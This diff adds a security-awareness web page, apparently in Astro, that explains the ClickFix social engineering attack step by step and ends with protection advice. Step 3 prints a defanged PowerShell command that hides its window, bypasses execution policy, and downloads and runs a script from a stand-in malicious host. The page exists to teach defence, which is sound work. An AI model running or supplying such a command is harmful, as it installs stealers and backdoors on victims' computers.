@@ -1,0 +1,374 @@
+---
+import Layout from "../layouts/Layout.astro";
+import Header from "../components/Header.astro";
+import CodeBlock from "../components/CodeBlock.astro";
+---
+
+<Layout title="How ClickFix Works | Technical Breakdown">
+	<Header />
+
+	<main class="container section">
+		<h1>How ClickFix Works</h1>
+		<p class="lead">
+			ClickFix is a social engineering attack that tricks you into running
+			malicious code on your own computer. Here's exactly how it works,
+			step by step.
+		</p>
+
+		<section class="step-guide">
+			<div class="step">
+				<div class="step-badge">Step 1</div>
+				<h2>You Visit a Compromised Website</h2>
+				<p>
+					You might click a link in an email, a search result, or even
+					visit a legitimate website that's been hacked. The page
+					looks normal at first, but then something appears to go
+					wrong.
+				</p>
+
+				<div class="example-box">
+					<h3>Common Scenarios:</h3>
+					<ul>
+						<li>
+							<strong>Fake CAPTCHA:</strong> "Click here to verify
+							you're human"
+						</li>
+						<li>
+							<strong>Browser Error:</strong> "Your browser needs an
+							update to view this page"
+						</li>
+						<li>
+							<strong>Video Conference:</strong> "Connection error
+							- please fix to join the meeting"
+						</li>
+						<li>
+							<strong>Document Viewer:</strong> "This PDF cannot be
+							displayed. Click to fix."
+						</li>
+					</ul>
+				</div>
+			</div>
+
+			<div class="step">
+				<div class="step-badge">Step 2</div>
+				<h2>The Fake "Fix" Instructions</h2>
+				<p>
+					A prompt appears with very specific instructions. It usually
+					says something like:
+				</p>
+
+				<div class="instruction-box">
+					<p>
+						<strong>1.</strong> Press the <kbd>Windows</kbd> key and
+						<kbd>R</kbd> key at the same time
+					</p>
+					<p>
+						<strong>2.</strong> Press <kbd>Ctrl</kbd> + <kbd>V</kbd>
+						to paste
+					</p>
+					<p><strong>3.</strong> Press <kbd>Enter</kbd></p>
+				</div>
+
+				<div class="info-box">
+					<h4>Why this is dangerous:</h4>
+					<p>
+						The <kbd>Win + R</kbd> combination opens the Windows "Run"
+						dialog, which is a powerful system tool. It can run any program
+						or command on your computer. When you press <kbd
+							>Ctrl + V</kbd
+						>, you're pasting a command that the malicious website
+						secretly copied to your clipboard.
+					</p>
+				</div>
+			</div>
+
+			<div class="step">
+				<div class="step-badge">Step 3</div>
+				<h2>The Malicious Command Executes</h2>
+				<p>
+					When you paste and press Enter, you're running a command
+					that looks something like this:
+				</p>
+
+				<CodeBlock
+					dangerous={true}
+					caption="Real ClickFix Payload Example (defanged)"
+					code={`powershell -windowstyle hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('hxxps://malicious-site[.]com/payload.ps1')"`}
+				/>
+
+				<div class="breakdown">
+					<h3>What each part does:</h3>
+					<dl>
+						<dt><code>powershell</code></dt>
+						<dd>
+							Launches PowerShell, a powerful command-line tool
+							built into Windows
+						</dd>
+
+						<dt><code>-windowstyle hidden</code></dt>
+						<dd>
+							Hides the window so you don't see what's happening
+						</dd>
+
+						<dt><code>-ExecutionPolicy Bypass</code></dt>
+						<dd>
+							Disables Windows security features that would
+							normally block suspicious scripts
+						</dd>
+
+						<dt><code>IEX</code></dt>
+						<dd>
+							Short for "Invoke-Expression" - runs whatever code
+							comes next
+						</dd>
+
+						<dt><code>New-Object Net.WebClient</code></dt>
+						<dd>
+							Creates a tool to download files from the internet
+						</dd>
+
+						<dt><code>DownloadString('hxxps://...')</code></dt>
+						<dd>
+							Downloads a malicious script from the attacker's
+							server and runs it immediately
+						</dd>
+					</dl>
+				</div>
+			</div>
+
+			<div class="step">
+				<div class="step-badge">Step 4</div>
+				<h2>The Malware Installs</h2>
+				<p>
+					The downloaded script typically does one or more of the
+					following:
+				</p>
+
+				<ul class="malware-actions">
+					<li>
+						<strong>Steals your passwords</strong> - Searches your browser's
+						saved passwords and sends them to the attacker
+					</li>
+					<li>
+						<strong>Steals your cookies</strong> - Takes your login sessions
+						so the attacker can access your accounts
+					</li>
+					<li>
+						<strong>Searches for cryptocurrency wallets</strong> - Looks
+						for Bitcoin, Ethereum, and other crypto wallet files
+					</li>
+					<li>
+						<strong>Takes screenshots</strong> - Captures what's on your
+						screen
+					</li>
+					<li>
+						<strong>Installs a backdoor</strong> - Gives the attacker
+						permanent remote access to your computer
+					</li>
+				</ul>
+
+				<div class="real-example">
+					<h3>Real Malware Families Distributed via ClickFix:</h3>
+					<ul>
+						<li>
+							<strong>Lumma Stealer</strong> - Most common, steals
+							passwords and cryptocurrency
+						</li>
+						<li>
+							<strong>Vidar Stealer</strong> - Targets browser data
+							and crypto wallets
+						</li>
+						<li>
+							<strong>DarkGate</strong> - Remote access trojan that
+							gives full control of your PC
+						</li>
+						<li>
+							<strong>AsyncRAT</strong> - Another remote access tool
+							used for surveillance
+						</li>
+					</ul>
+				</div>
+			</div>
+		</section>
+
+		<div class="protection-box card">
+			<h2>How to Protect Yourself</h2>
+			<ol class="protection-list">
+				<li>
+					<strong>Never paste commands from websites</strong> - No legitimate
+					website will ever ask you to open the Run dialog and paste a
+					command
+				</li>
+				<li>
+					<strong>Be suspicious of "fix" instructions</strong> - Real technical
+					problems don't get fixed by pasting mysterious commands
+				</li>
+				<li>
+					<strong>Check the URL</strong> - Real Google, Microsoft, or Facebook
+					pages won't show these prompts
+				</li>
+				<li>
+					<strong>When in doubt, close the tab</strong> - If something
+					feels off, just close the browser tab and navigate to the site
+					directly
+				</li>
+			</ol>
+		</div>
+
+		<div class="cta-box card">
+			<h3>See it in Action</h3>
+			<p>
+				Try our safe, interactive demo to see what a ClickFix attack
+				looks like.
+			</p>
+			<a href="/demo" class="btn btn-primary">View Interactive Demo</a>
+		</div>
+	</main>
+</Layout>
+
+<style>
+	.lead {
+		font-size: 1.25rem;
+		color: #4b5563;
+		margin-bottom: 3rem;
+		line-height: 1.6;
+	}
+
+	.step-guide {
+		margin: 3rem 0;
+	}
+	.step {
+		margin-bottom: 5rem;
+		padding-bottom: 3rem;
+		border-bottom: 1px solid var(--border-color);
+	}
+	.step:last-child {
+		border-bottom: none;
+	}
+
+	.step-badge {
+		display: inline-block;
+		background: #dbeafe;
+		color: #1e40af;
+		padding: 0.3rem 0.9rem;
+		border-radius: 4px;
+		font-size: 0.8rem;
+		font-weight: 700;
+		text-transform: uppercase;
+		margin-bottom: 1rem;
+	}
+
+	.example-box,
+	.info-box,
+	.real-example {
+		background: #f9fafb;
+		border-left: 4px solid #3b82f6;
+		padding: 1.5rem;
+		margin: 1.5rem 0;
+		border-radius: 4px;
+	}
+
+	.info-box {
+		background: #fffbeb;
+		border-left-color: #f59e0b;
+	}
+
+	.instruction-box {
+		background: #1f2937;
+		color: white;
+		padding: 1.5rem;
+		border-radius: 6px;
+		margin: 1.5rem 0;
+	}
+
+	.instruction-box p {
+		margin-bottom: 0.75rem;
+		font-family: "Courier New", monospace;
+		font-size: 1rem;
+	}
+
+	kbd {
+		background: #374151;
+		padding: 0.2rem 0.5rem;
+		border-radius: 3px;
+		font-family: monospace;
+		font-size: 0.9em;
+		border: 1px solid #4b5563;
+	}
+
+	.breakdown {
+		margin-top: 2rem;
+	}
+
+	.breakdown dl {
+		margin-top: 1rem;
+	}
+
+	.breakdown dt {
+		font-family: "Courier New", monospace;
+		background: #f3f4f6;
+		padding: 0.3rem 0.6rem;
+		border-radius: 3px;
+		display: inline-block;
+		margin-top: 1rem;
+		font-weight: 600;
+	}
+
+	.breakdown dd {
+		margin-left: 0;
+		margin-top: 0.5rem;
+		padding-left: 1rem;
+		color: #4b5563;
+	}
+
+	.malware-actions {
+		list-style: none;
+		padding: 0;
+		margin: 1.5rem 0;
+	}
+
+	.malware-actions li {
+		padding: 0.75rem 0;
+		padding-left: 2rem;
+		position: relative;
+	}
+
+	.malware-actions li:before {
+		content: "⚠️";
+		position: absolute;
+		left: 0;
+	}
+
+	.protection-box {
+		background: #f0fdf4;
+		border: 2px solid #22c55e;
+		margin-top: 4rem;
+	}
+
+	.protection-box h2 {
+		margin-top: 0;
+		color: #15803d;
+		border: none;
+	}
+
+	.protection-list {
+		margin: 1.5rem 0;
+		padding-left: 1.5rem;
+	}
+
+	.protection-list li {
+		margin-bottom: 1rem;
+		line-height: 1.6;
+	}
+
+	.cta-box {
+		margin-top: 3rem;
+		text-align: center;
+		background: #eff6ff;
+		border-color: #bfdbfe;
+	}
+	.cta-box h3 {
+		margin-top: 0;
+		border: none;
+	}
+</style>
